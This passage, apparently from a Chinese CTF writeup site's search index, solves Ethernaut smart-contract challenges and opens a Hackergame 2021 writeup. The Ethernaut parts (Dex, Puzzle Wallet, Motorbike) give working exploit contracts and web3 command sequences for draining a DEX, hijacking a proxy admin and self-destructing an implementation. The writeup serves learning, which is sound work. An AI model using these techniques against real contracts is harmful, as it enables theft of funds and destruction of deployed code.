\u4e2a\uff0c\u76ee\u7684\u662f\u628a\u9898\u76ee\u8d26\u6237\u4e0a\u7684\u67d0\u4e2a token \u6e05\u96f6 \u9898\u76ee\u7684 Dex \u5408\u7ea6\u4e3b\u8981\u63d0\u4f9b\u4e86 swap \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5728\u4e24\u4e2a token \u95f4\u4ea4\u6362\u91d1\u989d\u3002\u4f46\u662f\u8f6c\u51fa\u7684\u65f6\u5019\u5148\u8c03\u7528\u4e86 get_swap_price \u6765\u8ba1\u7b97\u91d1\u989d\uff0c\u800c\u4e14\u5728\u5176\u4e2d\u8c03\u7528\u7684\u662f\u4e24\u65b9\u683c\u5b50\u7684 balanceOf \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u65b0\u7684 IERC20 \u7684 token\uff0c\u8ba9\u5b83\u7684 balanceOf \u59cb\u7ec8\u8fd4\u56de 1\uff0c\u4f5c\u4e3a\u5206\u6bcd\uff0c\u8fd9\u6837\u8f6c\u51fa\u7684\u65f6\u5019\u5c31\u4f1a\u8f6c\u51fa\u9898\u76ee token \u4e2d\u7684\u6240\u6709\u4f59\u989d\u4e86 Dex Two \u548c Dex \u5dee\u522b\u5c31\u5728\u4e8e DexTwo \u9700\u8981\u5c06\u4e24\u4e2a token \u90fd\u7f6e\u4e3a 0\uff0c\u7528 exp \u51fd\u6570\u5206\u522b\u6253\u4e0b token1 \u548c token2 \u5c31\u884c exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Dex */ contract ExploitToken { function balanceOf ( address account ) public view returns ( uint256 ) { return 1 ; } function transferFrom ( address , address , uint256 ) public returns ( bool ) { return true ; } } contract Exploit { address token = address ( new ExploitToken ()); Dex challenge ; constructor ( address addr ) public { challenge = Dex ( addr ); } function exp ( address token1 ) public { challenge . swap ( token , token1 , 1 ); } }","title":"Dex &amp; Dex Two"},{"location":"writeups/ethernaut/#puzzle-wallet","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; pragma experimental ABIEncoderV2 ; import \"@openzeppelin/contracts/math/SafeMath.sol\" ; import \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\" ; contract PuzzleProxy is UpgradeableProxy { address public pendingAdmin ; address public admin ; constructor ( address _admin , address _implementation , bytes memory _initData ) UpgradeableProxy ( _implementation , _initData ) public { admin = _admin ; } modifier onlyAdmin { require ( msg.sender == admin , \"Caller is not the admin\" ); _ ; } function proposeNewAdmin ( address _newAdmin ) external { pendingAdmin = _newAdmin ; } function approveNewAdmin ( address _expectedAdmin ) external onlyAdmin { require ( pendingAdmin == _expectedAdmin , \"Expected new admin by the current admin is not the pending admin\" ); admin = pendingAdmin ; } function upgradeTo ( address _newImplementation ) external onlyAdmin { _upgradeTo ( _newImplementation ); } } contract PuzzleWallet { using SafeMath for uint256 ; address public owner ; uint256 public maxBalance ; mapping ( address => bool ) public whitelisted ; mapping ( address => uint256 ) public balances ; function init ( uint256 _maxBalance ) public { require ( maxBalance == 0 , \"Already initialized\" ); maxBalance = _maxBalance ; owner = msg.sender ; } modifier onlyWhitelisted { require ( whitelisted [ msg.sender ], \"Not whitelisted\" ); _ ; } function setMaxBalance ( uint256 _maxBalance ) external onlyWhitelisted { require ( address ( this ). balance == 0 , \"Contract balance is not 0\" ); maxBalance = _maxBalance ; } function addToWhitelist ( address addr ) external { require ( msg.sender == owner , \"Not the owner\" ); whitelisted [ addr ] = true ; } function deposit () external payable onlyWhitelisted { require ( address ( this ). balance <= maxBalance , \"Max balance reached\" ); balances [ msg.sender ] = balances [ msg.sender ]. add ( msg.value ); } function execute ( address to , uint256 value , bytes calldata data ) external payable onlyWhitelisted { require ( balances [ msg.sender ] >= value , \"Insufficient balance\" ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( value ); ( bool success , ) = to . call { value : value }( data ); require ( success , \"Execution failed\" ); } function multicall ( bytes [] calldata data ) external payable onlyWhitelisted { bool depositCalled = false ; for ( uint256 i = 0 ; i < data . length ; i ++ ) { bytes memory _data = data [ i ]; bytes4 selector ; assembly { selector : = mload ( add ( _data , 32 )) } if ( selector == this . deposit . selector ) { require ( ! depositCalled , \"Deposit can only be called once\" ); // Protect against reusing msg.value depositCalled = true ; } ( bool success , ) = address ( this ). delegatecall ( data [ i ]); require ( success , \"Error while delegating call\" ); } } } \u9898\u76ee\u6bd4\u8f83\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u4f7f PuzzleProxy \u7684 admin \u4e3a player \u56e0\u4e3a PuzzleProxy \u548c PuzzleWallet \u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u5b83\u4eec\u7684 storage \u4f1a\u5171\u7528\uff0c\u6240\u4ee5\u5c31\u5bfc\u81f4\u4e86 PuzzleProxy \u7684 pendingAdmin \u5bf9\u5e94\u4e86 PuzzleWallet \u7684 owner\uff0cPuzzleWallet \u7684 maxBalance \u5bf9\u5e94\u4e86 PuzzleProxy \u7684 admin \u4ece\u540e\u5f80\u524d\u63a8\uff1a \u8981\u4f7f admin \u53d8\u4e3a player\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e3a player \u800c setMaxBalance \u51fd\u6570\u9700\u8981\u5148\u4f7f\u5f53\u524d\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u53d8\u4e3a 0 \u5408\u7ea6\u8d26\u6237\u4f59\u989d\u51cf\u5c11\u7684\u65b9\u5f0f\u5728 execute \u4e2d\u7684 call\uff0c\u4f7f\u4f59\u989d\u51cf\u5c11 value \u4f46\u8fd9\u6837\u8981\u4f7f balances[player] >= value \u800c\u901a\u8fc7 deposit \u589e\u52a0 balances[player] \u7684\u8bdd\uff0c\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u4e5f\u4f1a\u540c\u6b65\u589e\u52a0 \u6240\u4ee5\u8981\u4f7f\u7528 multicall \u51fd\u6570\u6765\u4f7f balances[player] \u589e\u52a0\u91cf\u4e3a\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u589e\u52a0\u91cf\u7684\u4e8c\u500d \u4f46\u662f multicall \u4e2d\u68c0\u6d4b\u4e86 selector \u4f7f deposit \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u8fd9\u53ef\u4ee5\u901a\u8fc7 multicall \u4e2d\u6267\u884c\u4e24\u4e2a multicall\uff0c\u6bcf\u4e2a multicall \u8c03\u7528\u4e00\u6b21 deposit \u8fd9\u6837\u5206\u6790\u4e4b\u540e\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff0c\u9996\u5148\u8c03\u7528 proposeNewAdmin \u6765\u4f7f pendingAdmin\uff08owner\uff09\u53d8\u4e3a player\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u5408\u7ea6\u7684\u65b9\u5f0f\u8c03\u7528 > await web3 . eth . getStorageAt ( instance , 0 ) // owner '0x000000000000000000000000<level address>' > web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) // selector '0xa6376746' > data = web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) + player . slice ( 2 ). padStart ( 64 , \"0\" ) '0xa6376746000000000000000000000000<player address>' > web3 . eth . sendTransaction ({ from : player , to : instance , data : data }) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<player address>' \u7136\u540e\u62ff\u5230 owner \u540e\u9700\u8981\u5c06\u81ea\u5df1\u52a0\u5165\u767d\u540d\u5355\uff0c\u5e76\u4e14\u5148\u67e5\u8be2\u4e00\u4e0b\u5408\u7ea6\u8d26\u6237\u4f59\u989d > await contract . addToWhitelist ( player ) > await getBalance ( instance ) '0.001' \u6240\u4ee5\u9700\u8981\u6784\u9020\u4e00\u4e2a calldata\uff0c\u5b83\u4f1a\u901a\u8fc7 multicall \u8c03\u7528 deposit\uff0c\u7136\u540e\u628a\u4e24\u4e2a\u8fd9\u4e2a calldata \u4f20\u5165 multicall\uff0c\u540c\u65f6\u9644\u5e26 value 0.001 ether\uff0c\u8fd9\u6837 balances[player] \u5c31\u4f1a\u589e\u52a0 0.002 ether\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 execute \u76f4\u63a5\u63d0\u53d6\u51fa\u8fd9 0.002 ether \u63d0\u53d6\u540e\u5408\u7ea6\u8d26\u6237\u7684 balance \u53d8\u4e3a 0\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e86 > web3 . utils . sha3 ( \"deposit()\" ). slice ( 0 , 10 ) // deposit selector '0xd0e30db0' > data = ( await contract . methods [ \"multicall(bytes[])\" ]. request ([ \"0xd0e30db0\" ])). data // \u6784\u9020\u901a\u8fc7 multicall \u8c03\u7528 deposit \u7684 calldata '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000' > await contract . multicall ([ data , data ], { value : toWei ( \"0.001\" )}) > await getBalance ( instance ) '0.002' > contract . execute ( player , toWei ( \"0.002\" ), 0 > await getBalance ( instance ) '0' > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<level address>' > contract . setMaxBalance ( player ) > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<player address>'","title":"Puzzle Wallet"},{"location":"writeups/ethernaut/#motorbike","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity < 0.7.0 ; import \"@openzeppelin/contracts/utils/Address.sol\" ; import \"@openzeppelin/contracts/proxy/Initializable.sol\" ; contract Motorbike { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; struct AddressSlot { address value ; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor ( address _logic ) public { require ( Address . isContract ( _logic ), \"ERC1967: new implementation is not a contract\" ); _getAddressSlot ( _IMPLEMENTATION_SLOT ). value = _logic ; ( bool success ,) = _logic . delegatecall ( abi . encodeWithSignature ( \"initialize()\" ) ); require ( success , \"Call failed\" ); } // Delegates the current call to `implementation`. function _delegate ( address implementation ) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy ( 0 , 0 , calldatasize ()) let result : = delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) returndatacopy ( 0 , 0 , returndatasize ()) switch result case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate ( _getAddressSlot ( _IMPLEMENTATION_SLOT ). value ); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r_slot : = slot } } } contract Engine is Initializable { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; address public upgrader ; uint256 public horsePower ; struct AddressSlot { address value ; } function initialize () external initializer { horsePower = 1000 ; upgrader = msg.sender ; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall ( address newImplementation , bytes memory data ) external payable { _authorizeUpgrade (); _upgradeToAndCall ( newImplementation , data ); } // Restrict to upgrader role function _authorizeUpgrade () internal view { require ( msg.sender == upgrader , \"Can't upgrade\" ); } // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall ( address newImplementation , bytes memory data ) internal { // Initial upgrade and setup call _setImplementation ( newImplementation ); if ( data . length > 0 ) { ( bool success ,) = newImplementation . delegatecall ( data ); require ( success , \"Call failed\" ); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation ( address newImplementation ) private { require ( Address . isContract ( newImplementation ), \"ERC1967: new implementation is not a contract\" ); AddressSlot storage r ; assembly { r_slot : = _IMPLEMENTATION_SLOT } r . value = newImplementation ; } } \u540c\u6837\u6709\u4e9b\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u8981\u9500\u6bc1\u6389 Engine \u56e0\u4e3a\u6574\u4e2a\u5408\u7ea6\u4e2d\u90fd\u6ca1\u6709 selfdestruct\uff0c\u6240\u4ee5\u8981\u8f7d\u5165\u81ea\u5df1\u7684\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7 upgradeToAndCall \u51fd\u6570\u6765\u8f7d\u5165\u5408\u7ea6\u5e76\u8c03\u7528\uff0c\u8fd9\u9700\u8981\u901a\u8fc7 _authorizeUpgrade \u51fd\u6570\u7684\u68c0\u67e5\uff0c\u4e5f\u5c31\u662f\u68c0\u67e5 sender \u662f\u5426\u662f upgrader\uff0c\u800c\u6539\u53d8 upgrader \u53ef\u4ee5\u901a\u8fc7 initialize \u51fd\u6570\u6765\u5b8c\u6210 \u6240\u4ee5\u653b\u51fb\u6d41\u7a0b\u5c31\u662f\u5148\u901a\u8fc7 getStorageAt \u6765\u5f97\u5230\u90e8\u7f72\u7684 Engine \u7684\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528 initialize\uff0cupgradeToAndCall \u4e00\u4e2a\u90e8\u7f72\u7684\u65b0\u5408\u7ea6\uff0c\u8ba9\u5b83\u89e6\u53d1 selfdestruct \u5c31\u597d\u4e86 \u65b0\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { function exp () public { selfdestruct ( payable ( 0 )); } } \u653b\u51fb\u6d41\u7a0b\uff1a > await web3 . eth . getStorageAt ( instance , \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\" ) '0x000000000000000000000000<engine address>' > engine = \"0x<engine address>\" > data = web3 . utils . sha3 ( \"initialize()\" ). slice ( 0 , 10 ) '0x8129fc1c' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data }) > await web3 . eth . call ({ from : player , to : engine , data : web3 . utils . sha3 ( \"upgrader()\" ). slice ( 0 , 10 )}) // \u9a8c\u8bc1 upgrader '0x000000000000000000000000<player address>' > exp = \"<Exploit contract address>\" > expdata = web3 . utils . sha3 ( \"exp()\" ). slice ( 0 , 10 ) '0xab60ffda' > signature = { name : 'upgradeToAndCall' , type : 'function' , inputs : [ { type : 'address' , name : 'newImplementation' }, { type : 'bytes memory' , name : 'data' } ] } { name : 'upgradeToAndCall' , type : 'function' , inputs : Array ( 2 )} > data = web3 . eth . abi . encodeFunctionCall ( upgradeSignature , [ exp , expdata ]) '0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data })","title":"Motorbike"},{"location":"writeups/hackergame2021/","text":"Hackergame 2021 Writeup \u00b6 Abstract \u53c2\u52a0\u7684\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u7b97\u662f CTF \u7684\u6bd4\u8d5b\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1a https://blog.tonycrane.cc/p/c05d7b7c.html \u5b98\u65b9 writeup \u7b7e\u5230 \u00b6 \u4e3a\u4e86\u80fd\u8ba9\u5927\u5bb6\u987a\u5229\u7b7e\u5230\uff0c\u547d\u9898\u7ec4\u628a\u6bcf\u4e00\u79d2\u7684 flag \u90fd\u8bb0\u5f55\u4e0b\u6765\u5236\u6210\u4e86\u65e5\u8bb0\u672c\u7684\u4e00\u9875\u3002\u4f60\u53ea\u9700\u8981\u6253\u5f00\u65e5\u8bb0\uff0c\u7ffb\u5230 Hackergame 2021 \u6bd4\u8d5b\u8fdb\u884c\u671f\u95f4\u7684\u4efb\u4f55\u4e00\u9875\u5c31\u80fd\u5f97\u5230 flag\uff01 \u5f88\u660e\u786e\uff0c\u8fdb\u5165\u7f51\u5740\u540e\u4e00\u76f4\u70b9 Next \u7ffb\u5230\u6bd4\u8d5b\u65f6\u95f4\u5c31\u597d\u4e86\uff08\u8bef \u770b\u5230\u4e86 URI \u91cc\u6709 ?page=... \uff0c\u6240\u4ee5\u4e5f\u61d2\u5f97\u8ba1\u7b97\u4e86\uff0c\u624b\u52a8\u4e8c\u5206\uff0c\u5927\u6982 ?page=1635000000 \u5de6\u53f3\u5c31\u53ef\u4ee5\u770b\u5230 flag \u4e86 \u8d5b\u540e\u624d\u53cd\u5e94\u8fc7\u6765\u539f\u6765\u662f UNIX \u65f6\u95f4\u6233 \u8fdb\u5236\u5341\u516d\u2014\u2014\u53c2\u4e0a \u00b6 \u4e5f\u5f88\u660e\u786e\uff0c\u76f4\u63a5\u628a\u53f3\u4fa7\u6321\u4f4f\u7684 flag \u90e8\u5206\u5bf9\u5e94\u5de6\u8fb9\u7684\u5341\u516d\u8fdb\u5236\u6570\u6362\u7b97\u6210\u5341\u8fdb\u5236\uff0c\u7136\u540e\u6839\u636e ASCII \u7801\u8f6c\u6210\u5b57\u7b26\u3002\u6216\u8005\u76f4\u63a5\u628a\u5de6\u4fa7\u6284\u8fdb Hex Friend \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u53f3\u4fa7\u7684flag\u3002 \uff08**\u5f53\u65f6\u8fd9\u9898\u6284\u4e32\u884c\u4e86\u4e24\u4e09\u6b21\u2026\u2026\uff09 \u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2 \u00b6 \u5f53\u7136\uff0c\u5982\u679c\u53ea\u662f\u8fd9\u6837\u8fd8\u8fdc\u8fdc\u4e0d\u591f\u3002\u9075\u4f9d\u53f2\u79f0\u201c\u8001\u7239\u201d\u7684\u4e0a\u53e4\u5148\u8d24\u7684\u81f3\u7406\u540d\u8a00\uff0c\u5fc5\u987b\u8981\u201c\u7528\u9b54\u6cd5\u6253\u8d25\u9b54\u6cd5\u201d\u3002X \u540c\u5b66\u5411\u4e0a\u7ea7\u7533\u8bf7\u5230\u4e86\u79d1\u5927\u897f\u533a\u540c\u6b65\u8f90\u5c04\u5b9e\u9a8c\u5ba4\u8bbe\u5907\u7684\u4f7f\u7528\u6743\u9650\uff0c\u4ee5\u6b64\u6253\u901a\u6b21\u5143\u7a7a\u95f4\uff0c\u501f\u52a9\u5230\u53e6\u4e00\u4e2a\u5e73\u884c\u5b87\u5b99\u4e2d Z \u540c\u5b66\u7684\u6cd5\u529b\u8fdb\u884c\u6570\u636e\u5bf9\u51b2\uff0c\u65b9\u624d\u4e8e\u4e71\u4e2d\u640f\u5f97\u4e00\u4e1d\u673a\u4f1a\uff0c\u5c06 flag \u7528\u65e0\u7ebf\u7535\u7684\u5f62\u5f0f\u53d1\u5c04\u4e86\u51fa\u53bb\u3002 \u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u3002\u5373\u4f7f\u5982\u6b64\uff0c\u6253\u7834\u6b21\u5143\u7684\u5f3a\u5927\u80fd\u91cf\u626d\u66f2\u4e86\u65f6\u7a7a\uff0c\u4f7f\u5f97\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u3002 \uff08\u8fd9\u9898\u5728\u7fa4\u91cc\u770b\u8d77\u6765\u597d\u50cf\u5361\u4e86\u5f88\u591a\u4eba\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff09 \u9898\u76ee\u4e0b\u8f7d\u4e0b\u6765\u662f\u4e00\u4e2a\u542c\u8d77\u6765\u6742\u4e71\u7684\u97f3\u9891 \u9898\u91cc\u6700\u540e\u8bf4\u4e86 \u201c\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684 \u901f\u5ea6 \u6709\u6240\u6539\u53d8\u201d\uff0c\u6240\u4ee5\u8003\u8651\u5c06\u97f3\u9891\u65f6\u95f4\u62c9\u957f\u3002 \u6700\u5f00\u59cb\u4f7f\u7528\u4e86 Adobe Audition\uff0c\u4f46\u662f\u6548\u679c\u4e0d\u662f\u5f88\u7406\u60f3\uff0c\u5927\u6982\u662f\u91cd\u65b0\u91c7\u6837\u7b49\u4e00\u7cfb\u5217\u7b97\u6cd5\u5bfc\u81f4\u7684 \u6240\u4ee5\u6362\u4e86 Adobe Premier Pro \u76f4\u63a5\u7528\u6bd4\u7387\u62c9\u4f38\u5de5\u5177\u62c9\u957f\u97f3\u9891\uff0c\u8fd8\u662f\u53ef\u4ee5\u542c\u6e05\u7684 \u4e0d\u65ad\u5c1d\u8bd5\u4e4b\u540e\uff0c\u5927\u6982\u653e\u6162\u4e09\u500d\u5de6\u53f3\u5c31\u53ef\u4ee5\u542c\u51fa\u8bfb\u7684\u662f\u82f1\u8bed\u5355\u8bcd\u4e86 \u9898\u91cc\u8bf4\u5230\u4e86 \u201c\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86 \u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5 \u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u201d\uff0c\u6240\u4ee5\u5c31\u67e5\u5230\u4e86 \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 \u7136\u540e\u4ed4\u7ec6\u542c\uff0c\u8fa8\u522b\u6bcf\u4e2a\u5355\u8bcd\u7684\u7b2c\u4e00\u4e2a\u97f3\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86 \u732b\u54aa\u95ee\u7b54 Pro Max \u00b6 \u4e94\u9053\u5201\u94bb\u7684\u9898\u76ee\uff0c\u4f46\u662f\u8fd8\u662f\u597d\u67e5\u5230\u7684\uff0c\u9898\u76ee\u91cc\u4e5f\u8bf4\u4e86\u201c\u89e3\u51fa\u8c1c\u9898\u4e0d\u9700\u8981\u662f\u79d1\u5927\u5728\u6821\u5b66\u751f\u201d 2017 \u5e74\uff0c\u4e2d\u79d1\u5927\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\uff08SEC@USTC\uff09\u5e76\u5165\u4e2d\u79d1\u5927 Linux \u7528\u6237\u534f\u4f1a\uff08USTCLUG\uff09\u3002\u76ee\u524d\uff0c\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u57df\u540d\uff08sec.ustc.edu.cn\uff09\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f46\u4f60\u80fd\u627e\u5230\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u793e\u56e2\u7ae0\u7a0b\u5728\u54ea\u4e00\u5929\u7684\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u4e0a\u901a\u8fc7\u7684\u5417\uff1f \u770b\u5230\u4e86 \u201c\u76ee\u524d\uff0c\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\u201d \u8bf4\u660e\u8fd9\u4e2a\u57df\u540d\u66fe\u7ecf\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\uff0c\u76f4\u63a5\u901a\u8fc7 \u4e92\u8054\u7f51\u7684\u8bb0\u5fc6 archive.org\uff0c\u67e5\u5230\u8fd9\u4e2a\u57df\u540d\u7684\u5386\u53f2\u5b58\u6863\uff0c\u968f\u4fbf\u627e\u4e00\u5929\u5c31\u53ef\u4ee5\u770b\u5230\u4ed6\u4eec\u5b98\u7f51\u4e2d\u7684 \u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u793e\u56e2\u7ae0\u7a0b \u3002 \u5176\u4e2d\u7b2c\u4e00\u884c\u5c31\u5199\u4e86 \u201c\u672c\u7ae0\u7a0b\u5728 2015 \u5e74 5 \u6708 4 \u65e5 \uff0c\u7ecf\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u5ba1\u8bae\u901a\u8fc7\u3002\u201d \u6240\u4ee5\u7b54\u6848\u5c31\u662f 20150504 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u5728\u8fd1\u4e94\u5e74\u591a\u5c11\u6b21\u88ab\u8bc4\u4e3a\u6821\u4e94\u661f\u7ea7\u793e\u56e2\uff1f \u76f4\u63a5\u53bb\u79d1\u5927 LUG \u5b98\u7f51\u7684 Intro \u9875\u9762 \uff0c\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u4e8e 2015 \u5e74 5 \u6708\u30012017 \u5e74 7 \u6708\u30012018 \u5e74 9 \u6708\u30012019 \u5e74 8 \u6708\u53ca 2020 \u5e74 9 \u6708\u88ab\u8bc4\u4e3a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u4e94\u661f\u7ea7\u5b66\u751f\u793e\u56e2\u3002\u201d \u6240\u4ee5\u662f4\u6b21\uff08x \u4f46\u662f\u6000\u7591\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u6ca1\u67092021\u5e74\uff0c\u56e0\u4e3a\u90fd\u662f\u57289\u6708\u4efd\u5de6\u53f3\uff0c\u6240\u4ee5\u53ef\u80fd\u662f\u6570\u636e\u6ca1\u66f4\u65b0\uff0c\u8fd9\u98984\u548c5\u90fd\u6709\u53ef\u80fd \u5c1d\u8bd5\u540e\u5f97\u5230\u7b54\u6848\u662f 5 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u4f4d\u4e8e\u897f\u533a\u56fe\u4e66\u9986\u7684\u6d3b\u52a8\u5ba4\u95e8\u53e3\u7684\u724c\u5b50\u4e0a\u201cLUG @ USTC\u201d\u4e0b\u65b9\u7684\u5c0f\u5b57\u662f\uff1f \u8fd9\u9898\u4e5f\u7b80\u5355\uff0c\u76f4\u63a5\u95ee\u79d1\u5927\u540c\u5b66\u5c31\u597d\u4e86\uff08x \u7ffb\u4e86 LUG \u7684\u5fae\u4fe1\u516c\u4f17\u53f7\u548c QQ \u5b98\u65b9\u53f7\uff0c\u90fd\u6ca1\u5565\u6536\u83b7\uff0c\u6700\u540e\u53d1\u73b0\u5b98\u7f51\u4e0a\u6709 News \u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u65b0\u542f\u7528\u6d3b\u52a8\u5ba4\u7684\u8bdd\uff0c\u4e00\u5b9a\u4f1a\u6709\u4e00\u7bc7\u65b0\u95fb\u7a3f\uff0c\u641c\u7d22\u201c\u56fe\u4e66\u9986\u201d\u5f97\u5230\u4e86 \u300c\u897f\u533a\u56fe\u4e66\u9986\u65b0\u6d3b\u52a8\u5ba4\u542f\u7528\u300d \u8fd9\u7bc7\u6587\u7ae0\uff0c\u5f00\u7bc7\u7b2c\u4e00\u5f20\u5927\u56fe\u5c31\u662f\u95e8\u53e3\u724c\u5b50\u7684\u7167\u7247 \u6240\u4ee5\u7b54\u6848\u662f Development Team of Library \uff08\u6ce8\u610f\u5927\u5c0f\u5199\uff09 \u5728 SIGBOVIK 2021 \u7684\u4e00\u7bc7\u5173\u4e8e\u4e8c\u8fdb\u5236 Newcomb-Benford \u5b9a\u5f8b\u7684\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u4e00\u5171\u5c55\u793a\u4e86\u591a\u5c11\u4e2a\u6570\u636e\u96c6\u5bf9\u5176\u7406\u8bba\u7ed3\u679c\u8fdb\u884c\u9a8c\u8bc1\uff1f \u5e94\u8be5\u6ca1\u5fc5\u8981\u641c\u8c37\u6b4c\u5b66\u672f\u4e4b\u7c7b\u7684\uff0c\u76f4\u63a5\u5fc5\u5e94\u67e5 \u201cSIGBOVIK Newcomb-Benford\u201d \u5c31\u53ef\u4ee5\u627e\u5230 SIGBOVIK \u7684 \u8fd9\u4e00\u7bc7\u5927\u6587\u7ae0\u5408\u96c6 \uff0c\u518d\u641c\u7d22 Newcomb \u5c31\u53ef\u4ee5\u770b\u5230\u9898\u76ee\u91cc\u8bf4\u7684\u8bba\u6587\u4e86\u3002 \u5168\u6587\u4e5f\u4e0d\u957f\uff0c\u53ea\u6709\u56db\u9875\uff0c\u540e\u4e24\u9875\u5168\u662f\u6570\u636e\u7684\u56fe\uff0c\u6570\u4e00\u4e0b\uff0c\u4e00\u5171\u670913\u5e45 \u6240\u4ee5\u7b54\u6848\u662f 13 \u4e0d\u4e25\u683c\u9075\u5faa\u534f\u8bae\u89c4\u8303\u7684\u64cd\u4f5c\u7740\u5b9e\u4ee4\u4eba\u751f\u538c\uff0c\u597d\u5728 IETF \u4e8e 2021 \u5e74\u6210\u7acb\u4e86 Protocol Police 